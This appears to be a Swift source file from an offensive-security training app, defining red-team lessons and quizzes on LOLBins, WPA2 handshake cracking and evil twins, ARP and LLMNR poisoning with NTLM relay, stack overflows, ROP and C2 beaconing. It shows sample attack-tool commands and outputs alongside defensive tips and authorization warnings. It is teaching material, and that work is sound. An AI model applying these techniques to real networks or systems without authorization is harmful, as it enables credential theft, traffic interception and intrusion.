                "LOLBins — certutil, rundll32, regsvr32, mshta, wmic, bitsadmin do attacker work while looking legitimate.",
                "LOLBAS project catalogs these binaries; the same list tells defenders what to hunt for.",
                "Detection is contextual: certutil is fine; certutil downloading an .exe from a raw IP is not."
            ]),
            .callout(.tip, "Blue team: this is why command-line and parent/child telemetry (Sysmon, EDR) matters more than file hashes. The detection isn't 'rundll32 exists' — it's 'rundll32 launched by Word, loading a DLL from a temp folder, then making a network connection.'"),
            .callout(.warning, "EDR has largely caught up with textbook CreateRemoteThread injection. Treat these as concepts to understand the detection story, not guaranteed bypasses — what works shifts constantly, which is the whole point of the cat-and-mouse."),
            .checkpoint(QuizQuestion(
                "Why does running a payload via process injection into `explorer.exe` help an attacker evade detection?",
                options: [
                    "explorer.exe is faster",
                    "The malicious code executes under a trusted, expected process's identity instead of an unknown new binary",
                    "It encrypts the payload",
                    "explorer.exe disables logging"
                ],
                correct: 1,
                why: "Injection lets code run inside a process defenders expect to see. There's no suspicious new executable — the activity hides behind explorer.exe's reputation and identity."))
        ],
        quiz: [
            QuizQuestion(
                "What is a 'LOLBin'?",
                options: [
                    "A custom malware dropper",
                    "A legitimate, signed system binary abused to perform attacker actions while looking normal",
                    "A type of firewall",
                    "A password-cracking tool"
                ],
                correct: 1,
                why: "Living-Off-the-Land Binaries are trusted built-in tools (certutil, rundll32, mshta…) repurposed by attackers, so the activity blends in with normal OS behavior."),
            QuizQuestion(
                "Which trio of Windows APIs is the hallmark of classic process injection?",
                options: [
                    "VirtualAllocEx, WriteProcessMemory, CreateRemoteThread",
                    "open, read, write",
                    "connect, send, recv",
                    "malloc, free, exit"
                ],
                correct: 0,
                why: "Allocate memory in the target (VirtualAllocEx), write the shellcode (WriteProcessMemory), and execute it (CreateRemoteThread) is the textbook injection sequence EDR watches for."),
            QuizQuestion(
                "Why does LOLBin abuse make signature-based AV ineffective?",
                options: [
                    "The binaries are encrypted",
                    "The tools are legitimate signed Microsoft binaries, so there's no malicious file to signature — only behavior reveals the abuse",
                    "AV doesn't run on Windows",
                    "They only run in memory"
                ],
                correct: 1,
                why: "There's nothing foreign to match a signature against — it's trusted software. Detection has to come from behavioral context (who ran it, with what arguments, doing what).")
        ]
    )

    // MARK: R7 — Wireless & network attacks

    private static let wireless = Module(
        id: "red-wireless",
        title: "Wireless & Network Attacks",
        summary: "Step onto the local network — crack Wi-Fi, and poison the protocols that quietly trust each other.",
        systemImage: "wifi",
        lessons: [wifiLesson, mitmLesson]
    )

    private static let wifiLesson = Lesson(
        id: "red-wifi",
        title: "Wi-Fi Attacks: WPA2 & Evil Twin",
        subtitle: "The OSWP staples — capture a handshake to crack the key, or become the access point yourself.",
        minutes: 11,
        difficulty: .advanced,
        blocks: [
            .heading("Radio is just another medium"),
            .paragraph("Wi-Fi extends the network into the air, where anyone in range can listen. Attacking it (OffSec's OSWP) starts with a wireless card in **monitor mode**, which captures raw 802.11 frames — beacons, management frames, and the encrypted data of every nearby network. From there, two classic attacks dominate: cracking the pre-shared key, and impersonating the network."),
            .heading("Cracking WPA2-PSK"),
            .paragraph("WPA2-Personal protects traffic with a key derived from the Wi-Fi password. You don't crack it over the air — you capture the **4-way handshake** that a client and access point perform on connect (or grab the **PMKID** straight from the AP), then attack it offline. To speed things up, attackers send **deauthentication** frames to knock a client off so it reconnects and replays the handshake on cue."),
            .animation(.wifiHandshake, caption: "A deauth forces a reconnect; the attacker in monitor mode captures the 4-way handshake, then cracks the passphrase offline."),
            .terminal(prompt: "kali@lab",
                      command: "airodump-ng -c 6 --bssid AA:BB:.. -w cap wlan0mon\naircrack-ng -w rockyou.txt cap-01.cap",
                      output: """
[ WPA handshake: AA:BB:CC:DD:EE:FF ]
KEY FOUND! [ SummerBreeze2024 ]
# captured over the air, cracked offline — same dictionary game as password hashes
"""),
            .heading("The Evil Twin"),
            .paragraph("Why crack the key when the user will hand it to you? An **Evil Twin** is a rogue AP broadcasting the same SSID as a network the victim trusts. Deauth them from the real one, and their device may auto-join your clone. A captive portal (\"firmware update — re-enter Wi-Fi password\") harvests the passphrase, and once they're on your AP you're positioned for the man-in-the-middle attacks in the next lesson."),
            .keyPoints([
                "Monitor mode — the wireless card captures all 802.11 frames in range, not just its own.",
                "WPA2-PSK — capture the 4-way handshake (or PMKID), then crack offline (aircrack-ng / hashcat -m 22000).",
                "Deauth frames — force a client to reconnect so the handshake is captured on demand.",
                "Evil Twin — a look-alike AP that lures clients to harvest creds and enable MITM.",
                "A weak/known Wi-Fi password falls in seconds; a long random passphrase is the real defense."
            ]),
            .definition(term: "4-way handshake", meaning: "The WPA2 exchange where client and AP prove they share the passphrase-derived key and agree on session keys. Capturing it gives an attacker the material to verify password guesses offline — no further contact with the network needed."),
            .callout(.danger, "WPA2-Enterprise (802.1X) and a strong passphrase change the game — and WPA3 resists offline cracking by design. But misconfigured Enterprise setups leak crackable MSCHAPv2 challenges, and downgrade/Evil-Twin tricks still target the human."),
            .callout(.warning, "Only ever test wireless networks you own or are explicitly authorized to assess. Deauth and rogue APs disrupt and capture other people's traffic — doing so without scope is illegal radio interference and unauthorized interception."),
            .checkpoint(QuizQuestion(
                "Why does an attacker send deauthentication frames when attacking WPA2-PSK?",
                options: [
                    "To crack the password over the air",
                    "To force a client to disconnect and reconnect, replaying the 4-way handshake so it can be captured",
                    "To speed up the Wi-Fi",
                    "To disable the access point permanently"
                ],
                correct: 1,
                why: "The crackable material is in the 4-way handshake, which happens at connect time. Deauthing a client makes it reconnect on demand so the attacker can capture that handshake, then crack offline."))
        ],
        quiz: [
            QuizQuestion(
                "When attacking WPA2-PSK, where does the actual password cracking happen?",
                options: [
                    "Live, against the access point",
                    "Offline, against the captured handshake/PMKID — no further contact with the network",
                    "On the victim's phone",
                    "It doesn't require the password"
                ],
                correct: 1,
                why: "You capture the handshake (or PMKID) once, then guess passwords offline at full speed against it — the same model as offline hash cracking, immune to any rate limit."),
            QuizQuestion(
                "What makes an Evil Twin attack effective?",
                options: [
                    "It cracks WPA3 instantly",
                    "It impersonates a trusted SSID so victims connect and can be phished or man-in-the-middled",
                    "It only works on wired networks",
                    "It disables encryption everywhere"
                ],
                correct: 1,
                why: "A rogue AP cloning a trusted network's name lures clients (often automatically). From there the attacker harvests credentials via a captive portal and intercepts traffic."),
            QuizQuestion(
                "What is the single best defense for a WPA2-Personal network against offline cracking?",
                options: [
                    "Hiding the SSID",
                    "A long, random passphrase (and ideally WPA3 or 802.1X)",
                    "MAC address filtering",
                    "Turning the power down"
                ],
                correct: 1,
                why: "Since the handshake will be captured and attacked offline, key strength is everything. A long random passphrase makes cracking infeasible; WPA3 resists the offline attack by design.")
        ]
    )

    private static let mitmLesson = Lesson(
        id: "red-mitm",
        title: "Network Poisoning & MITM",
        subtitle: "ARP, LLMNR and the trusting protocols that let you sit in the middle and harvest hashes.",
        minutes: 11,
        difficulty: .advanced,
        blocks: [
            .heading("Local networks run on trust"),
            .paragraph("Once you have a foothold on a LAN, a family of protocols designed for convenience becomes your weapon. ARP, LLMNR, NBT-NS and mDNS all answer questions without authentication — so an attacker who simply *answers* can redirect traffic and capture credentials. No exploit, just protocols believing whoever replies first."),
            .heading("ARP poisoning → man-in-the-middle"),
            .paragraph("**ARP** maps IP addresses to MAC addresses on a LAN and has no authentication. Send forged ARP replies telling the victim 'the gateway is at *my* MAC' and the gateway 'the victim is at *my* MAC', and both send their traffic through you. Now you can sniff, and — if traffic isn't encrypted — read or alter it. This is the layer-2 attack you met defensively in the Networking lesson, weaponized."),
            .animation(.arpPoisoning, caption: "Forged ARP replies poison both caches so the victim's traffic to the gateway flows through the attacker first."),
            .heading("LLMNR/NBT-NS poisoning → captured hashes"),
            .paragraph("When Windows can't resolve a name via DNS, it shouts on the local network using **LLMNR** and **NBT-NS**: 'who is fileserver01?' Anything can answer. **Responder** answers *every* such query 'that's me' — and when the victim tries to authenticate, it captures their **NetNTLMv2** hash. Crack it offline, or **relay** it straight to another machine where that user is admin, for instant access without ever cracking it."),
            .terminal(prompt: "kali@lab",
                      command: "responder -I eth0",
                      output: """
[*] [LLMNR]  Poisoned answer sent to 10.0.0.5 for name fileserver01
[SMB] NTLMv2-SSP Hash : ACME\\j.doe:::a1b2...   <-- crack or relay
"""),
            .keyPoints([
                "ARP poisoning — forge IP→MAC mappings to insert yourself between two hosts (bettercap, arpspoof).",
                "LLMNR/NBT-NS poisoning — answer broadcast name lookups to capture NetNTLMv2 hashes (Responder).",
                "NTLM relay — forward a captured authentication to another host instead of cracking it (ntlmrelayx).",
                "MITM only reads plaintext — HTTPS/SSH still protect content; but the metadata and any cleartext is yours.",
                "Defenses: disable LLMNR/NBT-NS, enable SMB signing, use Dynamic ARP Inspection on switches."
            ]),
            .definition(term: "NTLM relay", meaning: "Rather than crack a captured NetNTLMv2 hash, immediately forward that authentication to a third system where the user has access. If SMB signing isn't enforced, you authenticate as the victim there — turning a poisoned name lookup into remote access with no cracking at all."),
            .callout(.tip, "Blue team: turning off LLMNR and NBT-NS (they're legacy fallbacks) and enforcing SMB signing kills the two highest-yield internal attacks Responder relies on. Dynamic ARP Inspection on managed switches shuts down ARP poisoning."),
            .callout(.danger, "These attacks are loud and disruptive — and capture other people's credentials. They belong only in authorized internal engagements with the network owner's written consent."),
            .checkpoint(QuizQuestion(
                "Responder captures a NetNTLMv2 hash via LLMNR poisoning, but it won't crack. What else can an attacker do with it?",
                options: [
                    "Nothing — an uncrackable hash is useless",
                    "Relay the authentication to another host where SMB signing isn't enforced and act as that user",
                    "Decrypt the victim's HTTPS",
                    "Reset the victim's password"
                ],
                correct: 1,
                why: "NTLM relay forwards the captured authentication to a third system in real time. If SMB signing isn't required there, the attacker authenticates as the victim without ever cracking the hash."))
        ],
        quiz: [
            QuizQuestion(
                "Why is ARP so easily abused for man-in-the-middle attacks?",
                options: [
                    "It is encrypted",
                    "It has no authentication — hosts trust any ARP reply mapping an IP to a MAC",
                    "It only works over the internet",
                    "It requires Domain Admin"
                ],
                correct: 1,
                why: "ARP accepts unsolicited, unauthenticated replies. Forging them lets an attacker poison the IP→MAC mappings of victim and gateway so traffic routes through the attacker."),
            QuizQuestion(
                "What does the tool Responder primarily exploit?",
                options: [
                    "A buffer overflow in Windows",
                    "Unauthenticated LLMNR/NBT-NS name-resolution broadcasts, answering them to capture NetNTLMv2 hashes",
                    "Weak TLS ciphers",
                    "Open FTP servers"
                ],
                correct: 1,
                why: "Responder answers the broadcast LLMNR/NBT-NS queries Windows makes when DNS fails, luring the victim into authenticating and capturing its NetNTLMv2 hash for cracking or relay."),
            QuizQuestion(
                "Which pair of changes most directly defangs LLMNR poisoning and NTLM relay?",
                options: [
                    "Longer passwords and antivirus",
                    "Disabling LLMNR/NBT-NS and enforcing SMB signing",
                    "Faster switches and more RAM",
                    "Hiding the SSID and MAC filtering"
                ],
                correct: 1,
                why: "Disabling the legacy LLMNR/NBT-NS fallbacks removes the poisoning surface, and enforcing SMB signing blocks relayed authentications — together they shut down Responder's two main wins.")
        ]
    )

    // MARK: R8 — Advanced exploitation & C2

    private static let advanced = Module(
        id: "red-advanced",
        title: "Advanced Exploitation & C2",
        summary: "Go under the hood: smash a stack, defeat modern memory mitigations with ROP, then run a covert command-and-control channel.",
        systemImage: "cpu.fill",
        lessons: [bofLesson, ropLesson, c2Lesson]
    )

    private static let bofLesson = Lesson(
        id: "red-buffer-overflow",
        title: "Stack Buffer Overflows",
        subtitle: "Overflow a buffer, overwrite the return address, and redirect a program's execution.",
        minutes: 13,
        difficulty: .expert,
        blocks: [
            .heading("Memory corruption, demystified"),
            .paragraph("When a program copies more data into a fixed-size buffer than it can hold, the excess spills over adjacent memory on the stack — including the saved **return address** that tells the CPU where to go when the function finishes. Control that address and you control execution. This is the foundation of binary exploitation and a rite of passage in offensive training."),
            .animation(.bufferOverflow, caption: "Input overruns a buffer and marches up the stack until it overwrites the saved return address — redirecting the CPU into attacker-controlled code."),
            .heading("Finding the offset"),
            .paragraph("You send a unique cyclic pattern, crash the program, and read which 4 bytes landed in the instruction pointer (EIP/RIP). That tells you exactly how many bytes precede the return address — the offset."),
            .terminal(prompt: "kali@lab",
                      command: "msf-pattern_create -l 600   →  crash  →  EIP = 39694438",
                      output: """
msf-pattern_offset -l 600 -q 39694438
[*] Exact match at offset 524
# 524 bytes of padding, then the next 4 bytes overwrite EIP
"""),
            .keyPoints([
                "Fuzz → crash → find offset → control EIP → redirect to your shellcode.",
                "A NOP sled (0x90...) gives your jump some slack to land in.",
                "Bad characters (null bytes, 0x0a) must be identified and avoided in the payload.",
                "Modern mitigations — DEP (no-execute stack), ASLR (randomized addresses), stack canaries — make naive overflows hard; bypasses (ROP) are the next chapter."
            ]),
            .definition(term: "Return address", meaning: "When a function is called, the CPU pushes the address to resume at afterward onto the stack. Overwriting it lets you choose where execution goes next — the heart of stack-overflow exploitation."),
            .callout(.warning, "Real-world targets ship DEP, ASLR and canaries, so a textbook 'jump to shellcode on the stack' usually won't work directly. Understanding the classic overflow is the mandatory foundation for the bypasses (ROP chains) that defeat those mitigations."),
            .checkpoint(QuizQuestion(
                "In a classic stack overflow, what does overwriting the saved return address let you do?",
                options: [
                    "Read the program's source code",
                    "Redirect the CPU to execute code of your choosing when the function returns",
                    "Crash the program harmlessly",
                    "Encrypt the stack"
                ],
                correct: 1,
                why: "The return address is where the CPU jumps when the function exits. Controlling it means controlling the instruction pointer — and therefore execution."))
        ],
        quiz: [
            QuizQuestion(
                "What is the purpose of a NOP sled in exploitation?",
                options: [
                    "To encrypt the payload",
                    "To give the jump target some slack so execution slides into the shellcode",
                    "To defeat ASLR",
                    "To find bad characters"
                ],
                correct: 1,
                why: "A run of no-operation instructions means that landing anywhere within it slides execution down into the shellcode, easing imprecise jumps."),
            QuizQuestion(
                "Which mitigation specifically prevents executing code placed on the stack?",
                options: ["ASLR", "DEP / NX (non-executable memory)", "Stack canary", "A firewall"],
                correct: 1,
                why: "DEP/NX marks the stack non-executable, so injected shellcode there won't run. ASLR randomizes addresses; canaries detect overwrites — each tackles a different aspect.")
        ]
    )

    private static let ropLesson = Lesson(
        id: "red-rop",
        title: "Defeating Mitigations: DEP, ASLR & ROP",
        subtitle: "The textbook overflow no longer works — so reuse the program's own code to win anyway.",
        minutes: 13,
        difficulty: .expert,
        blocks: [
            .heading("Why the classic overflow stopped working"),
            .paragraph("In the buffer-overflow lesson you overwrote the return address and jumped to shellcode on the stack. On any modern target that fails — because the defenders added mitigations. Modern exploit development (OffSec's OSED) is largely the art of defeating them. The two you must beat first are **DEP** and **ASLR**."),
            .keyPoints([
                "DEP / NX — marks the stack and heap non-executable, so injected shellcode won't run.",
                "ASLR — randomizes module and stack base addresses, so you can't hard-code a jump target.",
                "Stack canaries — a secret value before the return address; if your overflow changes it, the program aborts.",
                "CFG / SafeSEH and friends — further constrain where execution can be redirected."
            ]),
            .heading("ROP: turn the program's code against itself"),
            .paragraph("DEP stops you running *new* code — but the program is full of *existing* executable code you're allowed to run. **Return-Oriented Programming** strings together tiny snippets called **gadgets**, each ending in `ret`, already present in the binary or its libraries. By stacking gadget addresses on the stack, each `ret` jumps to the next, and you assemble the behavior you need — typically calling `VirtualProtect`/`mprotect` to make your shellcode region executable, or `system(\"/bin/sh\")` directly."),
            .animation(.ropChain, caption: "With the stack non-executable, the exploit chains existing gadgets — pop an argument, then return into system() — to get a shell with no injected code."),
            .terminal(prompt: "kali@lab",
                      command: "ROPgadget --binary ./vuln | grep ': pop rdi ; ret'",
                      output: """
0x0000000000401234 : pop rdi ; ret
0x0000000000401890 : ret              # alignment gadget
# chain: [pop rdi; ret] -> &\"/bin/sh\" -> [system]
"""),
            .heading("Beating ASLR"),
            .paragraph("ROP needs real addresses, but ASLR randomizes them. The standard answer is an **information leak**: a separate bug (a format string, an out-of-bounds read) that discloses one runtime address. Because a whole module is shifted by a single random offset, leaking one address de-randomizes the entire module — and your gadget addresses become known again. Non-randomized modules, or partial overwrites of the low bytes, are other ways in."),
            .definition(term: "Gadget", meaning: "A short sequence of existing instructions ending in `ret` (e.g. `pop rdi ; ret`). Chained via the stack, gadgets become a tiny programming language built entirely from code already in the target — sidestepping DEP, which only blocks *new* executable code."),
            .callout(.warning, "ROP is fiddly and target-specific: bad characters, stack alignment (x64 calling conventions need 16-byte alignment before a call), and ASLR all bite. It's the deep end of offensive work — and exactly why automated tooling never fully replaces understanding the internals."),
            .callout(.tip, "The mitigations aren't useless because ROP exists — they raise cost enormously. DEP forces ROP; ASLR forces an info leak; a canary forces yet another bug. Each layer turns a one-line exploit into a research project. That's defense in depth at the binary level."),
            .checkpoint(QuizQuestion(
                "DEP marks the stack non-executable, so your shellcode won't run there. How does Return-Oriented Programming get around this?",
                options: [
                    "It disables DEP with a password",
                    "It chains existing executable code 'gadgets' (each ending in ret) instead of running newly injected code",
                    "It encrypts the shellcode",
                    "It overflows a different buffer"
                ],
                correct: 1,
                why: "DEP only blocks executing *new* code. ROP reuses code already marked executable in the binary, chaining gadgets via the stack — so nothing new needs to run, and DEP is bypassed."))
        ],
        quiz: [
            QuizQuestion(
                "What does DEP (NX) specifically prevent?",
                options: [
                    "Randomizing addresses",
                    "Executing code from data regions like the stack and heap",
                    "Overflowing a buffer",
                    "Reading memory"
                ],
                correct: 1,
                why: "DEP/NX marks data pages non-executable, so injected shellcode on the stack or heap can't run. It's what forces attackers from direct shellcode to code-reuse (ROP)."),
            QuizQuestion(
                "Why does an attacker often need an information leak to build a working ROP chain on a modern target?",
                options: [
                    "To find the password",
                    "ASLR randomizes addresses, so leaking one runtime address de-randomizes the module and reveals gadget locations",
                    "To disable the canary",
                    "ROP doesn't need addresses"
                ],
                correct: 1,
                why: "ROP gadgets must be addressed precisely, but ASLR shifts modules by a random offset. Leaking a single address recovers that offset, restoring known gadget addresses across the whole module."),
            QuizQuestion(
                "A ROP 'gadget' is best described as…",
                options: [
                    "A complete exploit",
                    "A short sequence of existing instructions ending in ret, chained with others to do useful work",
                    "A type of shellcode",
                    "A firewall rule"
                ],
                correct: 1,
                why: "Gadgets are small snippets of already-present code ending in ret. Stacked addresses make each ret flow into the next gadget, assembling the attacker's logic from the program's own bytes.")
        ]
    )

    private static let c2Lesson = Lesson(
        id: "red-c2",
        title: "Command & Control (C2)",
        subtitle: "How operators control implants covertly — and how that channel gives them away.",
        minutes: 10,
        difficulty: .expert,
        blocks: [
            .heading("The operator's remote control"),
            .paragraph("After landing an implant, the attacker needs a reliable, stealthy way to issue commands and receive output. That's Command & Control. Modern C2 frameworks (Cobalt Strike, Sliver, Mythic, Havoc) have implants **beacon** — check in periodically rather than holding an obvious open connection — and blend their traffic into normal web requests."),
            .animation(.c2Beacon, caption: "An implant beacons home on a jittered interval over HTTPS, pulls a task, runs it, and returns output — hiding in plain web traffic."),
            .keyPoints([
                "Beaconing — periodic check-ins (with random 'jitter') instead of a constant connection.",
                "Channels — HTTPS, DNS, even Slack/cloud services to look legitimate.",
                "Domain fronting / redirectors — hide the real C2 server behind trusted infrastructure.",
                "Malleable profiles — shape traffic to mimic a real app's requests.",
                "OPSEC — sleep long, jitter hard, encrypt everything, rotate infrastructure."
            ]),
            .callout(.lab, "Build a feel for this on a lab range with an open-source framework like Sliver: stand up a listener, generate an implant, run it on a VM you own, and watch the beacon check in. Authorized lab targets only."),
            .definition(term: "Beacon jitter", meaning: "Randomized variation added to the check-in interval so callbacks don't occur on a perfectly regular clock — defeating simple 'phones home every 60s exactly' detections."),
            .heading("How the blue team catches it"),
            .paragraph("Ironically, the C2 channel is often the best place to catch an intruder. Beaconing has a rhythm; even with jitter, statistical analysis (beacon analysis) spots the regularity. Newly-registered domains, rare TLS certificates, and unusual process→network behavior all betray it. You'll study this from the defender's seat in the Blue Team track."),
            .checkpoint(QuizQuestion(
                "Why do C2 implants beacon periodically instead of holding a persistent connection?",
                options: [
                    "It's faster",
                    "Periodic, jittered check-ins blend into normal traffic and avoid the obviousness of a long-lived connection",
                    "Firewalls require it",
                    "It uses less electricity"
                ],
                correct: 1,
                why: "A constant open channel to an unknown host is conspicuous. Short, jittered, encrypted check-ins that look like ordinary web traffic are far harder to spot."))
        ],
        quiz: [
            QuizQuestion(
                "Despite jitter, network defenders can often detect C2 by…",
                options: [
                    "Reading the encrypted payload",
                    "Statistical beacon analysis plus signals like newly-registered domains and odd process/network behavior",
                    "Asking the attacker politely",
                    "Disabling HTTPS"
                ],
                correct: 1,
                why: "Beaconing leaves a statistical rhythm, and the surrounding infrastructure (young domains, rare certs) and host behavior provide detectable signals even when the payload itself is encrypted."),
            QuizQuestion(
                "What is a redirector in C2 infrastructure for?",
                options: [
                    "Speeding up the implant",
                    "Hiding the real C2 server behind trusted-looking infrastructure",
                    "Cracking passwords",
                    "Encrypting the disk"
                ],
                correct: 1,
                why: "Redirectors sit between victims and the team server, masking the true C2 location and making takedown and attribution harder.")
        ]
    )
}
